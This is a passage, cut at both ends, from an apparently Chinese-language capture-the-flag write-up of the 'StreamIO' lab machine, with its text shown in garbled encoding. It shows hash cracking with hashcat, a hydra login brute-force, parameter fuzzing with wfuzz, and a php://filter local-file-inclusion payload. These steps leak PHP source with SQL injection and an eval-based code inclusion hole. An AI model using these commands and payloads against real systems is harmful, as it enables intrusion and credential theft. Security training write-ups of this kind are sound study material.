083ffae904143c4796e464dac33c1f7d Lauren 08344b85b329d7efd611b7a7743e8a09 William d62be0dc82071bccc1322d64ec5b6c51 Sabrina f87d3c0d6c8fd686aacc6627f1f493a5 Robert f03b910e2bd0313a23fdd7575f34a694 Thane 3577c47eb1e12c8ba021611e1280753c Carmon 35394484d89fcfdb3c5e447fe749d213 Barry 54c88b2dbd7b1a84012fabc1a4c73415 Oliver fd78db29173a5cf701bd69027cb9bf6b Michelle b83439b16f844bd6ffe35c02fe21b3c0 Gloria 0cfaaaafb559f081df2befbe66686de0 Victoria b22abb47a02b52d5dfa27fb0b534f693 Alexendra 1c2b3d8270321140e5153f6637d3ee53 Baxter 22ee218331afd081b0dcd8115284bae3 Clara ef8f3d30a856cf166fb8215aca93e9ff Barbra 3961548825e3e21df5646cafe11c6c76 Lenord ee0b8a0937abd60c2882eacb2f8dc49f Austin 0049ac57646627b8d7aeaccf8b6a936f Garfield 8097cedd612cc37c29db152b6e9edbd3 Juliette 6dcd87740abb64edfa36d170f0d5450d Victor bf55e15b119860a6e6b5a164377da719 Lucifer 7df45a9e3de3863807c026ba48e55fb3 Bruno 2a4e2cf22dd8fcb45adcb91be1e22ae8 Diablo ec33265e5fc8c2f1b0c137bb7b3632b5 Robin dc332fb5576e9631c9dae83f194f8e70 Stan 384463526d288edcc95fc3701e523bc7 yoshihide b779ba15cedfd22a023c4d8bcf5f2332 admin 665a50ac9eaa781e4f7f04199db97a11&quot;</span></span><br><span class="line">a = a.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">f_user = <span class="built_in">open</span>(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">f_pass = <span class="built_in">open</span>(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">f_uap = <span class="built_in">open</span>(<span class="string">&quot;userpass&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        f_user.write(a[i] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        f_uap.write(a[i] + <span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f_pass.write(a[i] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        f_uap.write(a[i] + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">f_uap.close()</span><br><span class="line">f_user.close()</span><br><span class="line">f_pass.close()</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä½¿ç”¨hashcatå¯¹å¯†ç è¿›è¡Œç ´è§£ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">â””â”€<span class="comment"># hashcat userpass /usr/share/wordlists/rockyou.txt --username -m 0 --show</span></span><br><span class="line">Lauren:08344b85b329d7efd611b7a7743e8a09:<span class="comment">##123a8j8w5123##</span></span><br><span class="line">Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$</span><br><span class="line">Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical</span><br><span class="line">Barry:54c88b2dbd7b1a84012fabc1a4c73415:<span class="variable">$hadoW</span></span><br><span class="line">Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123</span><br><span class="line">Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!</span><br><span class="line">Clara:ef8f3d30a856cf166fb8215aca93e9ff:%<span class="variable">$clara</span></span><br><span class="line">Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i</span><br><span class="line">Juliette:6dcd87740abb64edfa36d170f0d5450d:<span class="variable">$3xybitch</span></span><br><span class="line">Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$</span><br><span class="line">yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..</span><br><span class="line">admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd</span><br></pre></td></tr></table></figure><p>ç»§ç»­å¯¹è¯¥ç»“æœè¿›è¡Œå¤„ç†ï¼Œå°†usernameéƒ½å‚¨å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œå°†å·²ç ´è§£çš„passwordéƒ½å‚¨å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œä»¥åŠæŒ‰ç…§<code>username:password</code>çš„æ ¼å¼å†ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hashcat userpass /usr/share/wordlists/rockyou.txt --username -m 0 --show &gt; tmp</span><br><span class="line"><span class="built_in">cat</span> tmp |awk -F : <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; cracked_username</span><br><span class="line"><span class="built_in">cat</span> tmp |awk -F : <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> &gt; cracked_password</span><br><span class="line"><span class="built_in">cat</span> tmp |awk -F : -v OFS=<span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print $1,$3&#125;&#x27;</span> &gt; cracked_userpass</span><br></pre></td></tr></table></figure><p>å› ä¸ºæˆ‘ä»¬æ‹¿åˆ°çš„æ˜¯STREAMIOçš„usersæ•°æ®åº“ï¼Œå¯ä»¥çŒœæµ‹å‡ºè¿™åº”è¯¥å¯ä»¥ç”¨äº<code>https://streamio.htb</code>çš„ç™»å½•ã€‚ä½†æ˜¯éšä¾¿ç”¨äº†ä¸€æ‰¹è´¦æˆ·å¯†ç æ²¡ç™»è¿›å»ï¼Œé‚£è¯•è¯•çˆ†ç ´ä¸€ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â””â”€<span class="comment"># hydra -C cracked_userpass streamio.htb https-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:Failed&quot;             </span></span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-10 11:35:12</span><br><span class="line">[DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries, ~1 try per task</span><br><span class="line">[DATA] attacking http-post-forms://streamio.htb:443/login.php:username=^USER^&amp;password=^PASS^:Failed</span><br><span class="line">[443][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-10 11:35:14</span><br></pre></td></tr></table></figure><p>å¾—åˆ°äº†ä¸€å¯¹å¯ç”¨çš„è´¦å·å¯†ç ï¼š<code>yoshihide:66boysandgirls..</code>ã€‚æ¥ä¸‹æ¥ç™»å½•ä¹‹åï¼Œè®¿é—®ä¹‹å‰çˆ†ç ´å‡ºçš„&#x2F;adminç›®å½•ï¼š</p><p><a href="https://pic.imgdb.cn/item/65760f55c458853aef54499a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f55c458853aef54499a.jpg"></a></p><p>æ˜¯ä¸€ä¸ªç®¡ç†å‘˜é¢æ¿ã€‚ç»è¿‡è§‚å¯Ÿï¼Œå‘ç°GETä¼ å…¥çš„å‚æ•°ä¸åŒï¼Œä¼šè½¬åˆ°ä¸åŒçš„é¡µé¢ï¼š</p><p><a href="https://pic.imgdb.cn/item/65760f5fc458853aef545dce.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f5fc458853aef545dce.jpg"></a></p><p>ä½†æ˜¯å°è¯•å°†è¿™äº›å‚æ•°çš„å€¼æ”¹æˆä¹‹å‰å¾—åˆ°çš„master.phpä¹‹åï¼Œå¹¶æœªå¾—åˆ°ä»»ä½•ç»“æœã€‚å› æ­¤å¯ä»¥å°è¯•å‚æ•°çˆ†ç ´ï¼Œçœ‹çœ‹æ˜¯å¦å­˜åœ¨æˆ‘ä»¬éšè—ç•Œé¢ï¼Œä»¥ä¸‹æ˜¯çˆ†ç ´çš„ç»“æœï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wfuzz -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt -c -u https://streamio.htb/admin/?FUZZ= -H &quot;Cookie: PHPSESSID=puqalerh2km91i9t6p5aa0qggq&quot;  --hw 131</span></span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: https://streamio.htb/admin/?FUZZ=</span></span><br><span class="line"><span class="string">Total requests: 6453</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word       Chars       Payload                                                                                                                   </span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000001575:   200        49 L     137 W      1712 Ch     &quot;debug&quot;                                                                                                                   </span></span><br><span class="line"><span class="string">000003530:   200        10790    25878 W    320235 Ch   &quot;movie&quot;                                                                                                                   </span></span><br><span class="line"><span class="string">                        L                                                                                                                                                         </span></span><br><span class="line"><span class="string">000005450:   200        398 L    916 W      12484 Ch    &quot;staff&quot;                                                                                                                   </span></span><br><span class="line"><span class="string">000006133:   200        62 L     160 W      2073 Ch     &quot;user&quot;                                                                                                                    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Total time: 76.33917</span></span><br><span class="line"><span class="string">Processed Requests: 6453</span></span><br><span class="line"><span class="string">Filtered Requests: 6449</span></span><br><span class="line"><span class="string">Requests/sec.: 84.53064</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿˜å­˜åœ¨ä¸€ä¸ªdebugå‚æ•°ï¼Œæˆ‘ä»¬è®¿é—®ä¹‹åï¼Œç»“æœå¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/65760f6bc458853aef547ee9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f6bc458853aef547ee9.jpg"></a></p><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œæç¤ºæˆ‘ä»¬æ­¤é€‰é¡¹ä»…ä¾›å¼€å‘è€…ä½¿ç”¨ã€‚æˆ‘ä»¬å°†debugçš„å€¼è®¾ä¸ºmaster.phpä¹‹åï¼Œå‘ç°åˆå‡ºç°äº†movieã€staffä»¥åŠuserçš„ç®¡ç†ç•Œé¢çš„è¯¦æƒ…ã€‚å°è¯•phpä¼ªåè®®è¯»ä¸€ä¸‹ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://streamio.htb/admin/?debug=php://filter/read=convert.base64-encode/resource=master.php</span><br></pre></td></tr></table></figure><p>å°†å¾—åˆ°çš„ç»“æœbase64è§£ç åï¼Œå¾—åˆ°master.phpçš„æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;Movie managment&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;included&#x27;</span>))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Only accessable through includes&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;movie_id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;delete from movies where id = &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;movie_id&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">sqlsrv_query</span>(<span class="variable">$handle</span>, <span class="variable">$query</span>, <span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">&quot;Scrollable&quot;</span>=&gt;<span class="string">&quot;buffered&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select * from movies order by movie&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">sqlsrv_query</span>(<span class="variable">$handle</span>, <span class="variable">$query</span>, <span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">&quot;Scrollable&quot;</span>=&gt;<span class="string">&quot;buffered&quot;</span>));</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">sqlsrv_fetch_array</span>(<span class="variable">$res</span>, SQLSRV_FETCH_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>: 3<span class="title">rem</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h4</span> <span class="title">style</span>=&quot;<span class="title">float</span>:<span class="title">left</span>;&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">movie</span>&#x27;]; ?&gt;&lt;/<span class="title">h4</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">style</span>=&quot;<span class="title">float</span>:<span class="title">right</span>;<span class="title">padding</span>-<span class="title">right</span>: 25<span class="title">px</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">action</span>=&quot;?<span class="title">movie</span>=&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">hidden</span>&quot; <span class="title">name</span>=&quot;<span class="title">movie_id</span>&quot; <span class="title">value</span>=&quot;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">id</span>&#x27;]; ?&gt;&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">sm</span> <span class="title">btn</span>-<span class="title">primary</span>&quot; <span class="title">value</span>=&quot;<span class="title">Delete</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125; # <span class="title">while</span> <span class="title">end</span></span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">br</span>&gt;&lt;<span class="title">hr</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h1</span>&gt;<span class="title">Staff</span> <span class="title">managment</span>&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">if</span>(!<span class="title">defined</span>(&#x27;<span class="title">included</span>&#x27;))</span></span><br><span class="line"><span class="class"><span class="title">die</span>(&quot;<span class="title">Only</span> <span class="title">accessable</span> <span class="title">through</span> <span class="title">includes</span>&quot;);</span></span><br><span class="line"><span class="class">$<span class="title">query</span> = &quot;<span class="title">select</span> * <span class="title">from</span> <span class="title">users</span> <span class="title">where</span> <span class="title">is_staff</span> = 1 &quot;;</span></span><br><span class="line"><span class="class">$<span class="title">res</span> = <span class="title">sqlsrv_query</span>($<span class="title">handle</span>, $<span class="title">query</span>, <span class="title">array</span>(), <span class="title">array</span>(&quot;<span class="title">Scrollable</span>&quot;=&gt;&quot;<span class="title">buffered</span>&quot;));</span></span><br><span class="line"><span class="class"><span class="title">if</span>(<span class="title">isset</span>($<span class="title">_POST</span>[&#x27;<span class="title">staff_id</span>&#x27;]))</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">alert</span> <span class="title">alert</span>-<span class="title">success</span>&quot;&gt; <span class="title">Message</span> <span class="title">sent</span> <span class="title">to</span> <span class="title">administrator</span>&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">$<span class="title">query</span> = &quot;<span class="title">select</span> * <span class="title">from</span> <span class="title">users</span> <span class="title">where</span> <span class="title">is_staff</span> = 1&quot;;</span></span><br><span class="line"><span class="class">$<span class="title">res</span> = <span class="title">sqlsrv_query</span>($<span class="title">handle</span>, $<span class="title">query</span>, <span class="title">array</span>(), <span class="title">array</span>(&quot;<span class="title">Scrollable</span>&quot;=&gt;&quot;<span class="title">buffered</span>&quot;));</span></span><br><span class="line"><span class="class"><span class="title">while</span>($<span class="title">row</span> = <span class="title">sqlsrv_fetch_array</span>($<span class="title">res</span>, <span class="title">SQLSRV_FETCH_ASSOC</span>))</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>: 3<span class="title">rem</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h4</span> <span class="title">style</span>=&quot;<span class="title">float</span>:<span class="title">left</span>;&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">username</span>&#x27;]; ?&gt;&lt;/<span class="title">h4</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">style</span>=&quot;<span class="title">float</span>:<span class="title">right</span>;<span class="title">padding</span>-<span class="title">right</span>: 25<span class="title">px</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">hidden</span>&quot; <span class="title">name</span>=&quot;<span class="title">staff_id</span>&quot; <span class="title">value</span>=&quot;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">id</span>&#x27;]; ?&gt;&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">sm</span> <span class="title">btn</span>-<span class="title">primary</span>&quot; <span class="title">value</span>=&quot;<span class="title">Delete</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125; # <span class="title">while</span> <span class="title">end</span></span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">br</span>&gt;&lt;<span class="title">hr</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h1</span>&gt;<span class="title">User</span> <span class="title">managment</span>&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">if</span>(!<span class="title">defined</span>(&#x27;<span class="title">included</span>&#x27;))</span></span><br><span class="line"><span class="class"><span class="title">die</span>(&quot;<span class="title">Only</span> <span class="title">accessable</span> <span class="title">through</span> <span class="title">includes</span>&quot;);</span></span><br><span class="line"><span class="class"><span class="title">if</span>(<span class="title">isset</span>($<span class="title">_POST</span>[&#x27;<span class="title">user_id</span>&#x27;]))</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;delete from users where is_staff = 0 and id = &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">sqlsrv_query</span>(<span class="variable">$handle</span>, <span class="variable">$query</span>, <span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">&quot;Scrollable&quot;</span>=&gt;<span class="string">&quot;buffered&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select * from users where is_staff = 0&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">sqlsrv_query</span>(<span class="variable">$handle</span>, <span class="variable">$query</span>, <span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">&quot;Scrollable&quot;</span>=&gt;<span class="string">&quot;buffered&quot;</span>));</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">sqlsrv_fetch_array</span>(<span class="variable">$res</span>, SQLSRV_FETCH_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>: 3<span class="title">rem</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h4</span> <span class="title">style</span>=&quot;<span class="title">float</span>:<span class="title">left</span>;&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">username</span>&#x27;]; ?&gt;&lt;/<span class="title">h4</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">style</span>=&quot;<span class="title">float</span>:<span class="title">right</span>;<span class="title">padding</span>-<span class="title">right</span>: 25<span class="title">px</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">hidden</span>&quot; <span class="title">name</span>=&quot;<span class="title">user_id</span>&quot; <span class="title">value</span>=&quot;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">id</span>&#x27;]; ?&gt;&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">sm</span> <span class="title">btn</span>-<span class="title">primary</span>&quot; <span class="title">value</span>=&quot;<span class="title">Delete</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125; # <span class="title">while</span> <span class="title">end</span></span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">br</span>&gt;&lt;<span class="title">hr</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">include</span>&quot; <span class="title">hidden</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">if</span>(<span class="title">isset</span>($<span class="title">_POST</span>[&#x27;<span class="title">include</span>&#x27;]))</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>] !== <span class="string">&quot;index.php&quot;</span> ) </span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>]));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot; ---- ERROR ---- &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„çœ‹æœ€ä¸‹é¢è¿™éƒ¨åˆ†phpä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span 